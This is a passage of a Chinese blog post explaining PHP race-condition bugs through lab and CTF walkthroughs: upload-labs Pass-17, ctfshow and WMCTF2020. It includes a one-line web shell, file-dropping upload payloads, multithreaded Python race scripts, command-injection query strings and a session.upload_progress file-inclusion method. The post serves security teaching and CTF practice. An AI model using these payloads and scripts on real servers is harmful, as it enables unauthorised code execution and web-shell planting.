    <link href="http://atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
    <id>http://atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-05-23T14:05:15.000Z</published>
    <updated>2021-05-28T10:31:45.566Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p><p><strong>条件竞争</strong>：<br>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程 或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。</p><p><strong>进程</strong>：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p><p><strong>线程</strong>：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br><strong>Session：</strong><br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02-漏洞分析"></a>0x02-漏洞分析</h2><p>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件</p><p>首先上传一个php文件，然后检测文件后缀名，如果不符合条件，就删掉，虽然php代码在执行的时候是线性执行代码的，但是执行的时候可以有多个线程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = substr(<span class="hljs-variable">$filename</span>,strrpos(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);   <span class="hljs-comment">#后缀</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmp</span>, <span class="hljs-variable">$path</span>))&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;   <span class="hljs-comment">#判断后缀是否为php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;upload success,file in &#x27;</span>.<span class="hljs-variable">$path</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>unlink(<span class="hljs-variable">$path</span>);    <span class="hljs-comment">#已经上传后判断若是PHP则删除</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can&#x27;t upload php file!&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;upload error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续上传一个php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>在执行完move_uploaded_file之后，执行unlink之前，此时这个php文件是已经保存到了web服务器上的，并且我们能够访问。</p><p>如果上传的php的功能是写一句话到一个php文件，这样我们在删除之前访问该文件，就会生成一个一句话木马，就可以得到webshell。 所以我们使用多线程并发的不断访问上传的文件，务器中的函数执行都是需要时间的，如果我上传上去的文件在没被删除的时候，一旦成功访问到了上传的文件，那么它就会向服务器写入shell。</p><p>   一般而言，我们是上传了文件，但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，以及删除文件的函数进行竞争。文件被访问了依旧可以删除，它删除跟我访问没有任何关系。</p><h2 id="0x03-CTF中的条件竞争"><a href="#0x03-CTF中的条件竞争" class="headerlink" title="0x03-CTF中的条件竞争"></a>0x03-CTF中的条件竞争</h2><h3 id="upload-libs-pass17"><a href="#upload-libs-pass17" class="headerlink" title="upload-libs pass17"></a>upload-libs pass17</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            unlink(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//存储在服务器的文件的临时副本的名称</span><br></code></pre></td></tr></table></figure><p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))<span class="hljs-comment">//移动到新文件夹</span><br></code></pre></td></tr></table></figure><p>绕过思路是利用代码执行过程有耗费时间的过程，上传速度大于匹配unlink条件就能显示webshell界面</p><p><strong>方法一</strong>：使用brup抓包</p><p>使用burpsuite抓包上传shell.php，一直重放上传文件</p><p>shell.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：pytho多线程上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure><p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p><p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure><p>查看所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09*`<br></code></pre></td></tr></table></figure><p>读取到部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`nl*`<br> <span class="hljs-number">2</span><span class="hljs-meta">?&gt;</span><br> <span class="hljs-number">3</span><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">4</span>    opendir(<span class="hljs-string">&quot;./&quot;</span>);<br> <span class="hljs-number">5</span>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$filename</span> = readdir()) &#123;<br> <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br> <span class="hljs-number">7</span>            unlink(<span class="hljs-variable">$filename</span>);<br> <span class="hljs-number">8</span>        &#125;<br> <span class="hljs-number">9</span>    &#125;<br><span class="hljs-number">10</span>    closedir();<br><span class="hljs-number">11</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成文件atkx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`nl%09/*&gt;atkx`<br></code></pre></td></tr></table></figure><p>直接使用羽师傅的脚本进行条件竞争，将源码写入atkx中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url1)<br>def read():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url2)<br><span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    <span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>t.start()<br></code></pre></td></tr></table></figure><p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>想要得到flag的话，直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p><ul><li>前提: 需要知道session文件的存放位置。</li><li>思路: 利用session.upload_progress将恶意语句写入session文件，从而包含session文件。</li></ul><p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。<span class="hljs-number">1.</span> session.upload_progress.enabled = on<br>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；<br><br><span class="hljs-number">2.</span> session.upload_progress.cleanup = on<br>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<br><br><span class="hljs-number">3.</span> session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+name将表示为session中的键名<br><br><span class="hljs-number">4.</span> session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br><br><span class="hljs-number">5.</span>session.use_strict_mode=off<br>这个选项默认值为off，表示对Cookie中sessionid可控。<br></code></pre></td></tr></table></figure><p>一个上传进度数组的结构的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在session中存放的数据<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p><p>Session的默认保存路径<br>在php.ini里的配置session.save_path是注释掉的，那么Seesion保存的路径在不同类型操作系统保存在什么位置？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br>/tmp 或 /var/lib/php/session<br><br>Windows：<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure><p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>理论具体参考：<a href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p><p>解题方法1：burpsite条件竞争</p><p>本地html向指定网址上传文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img 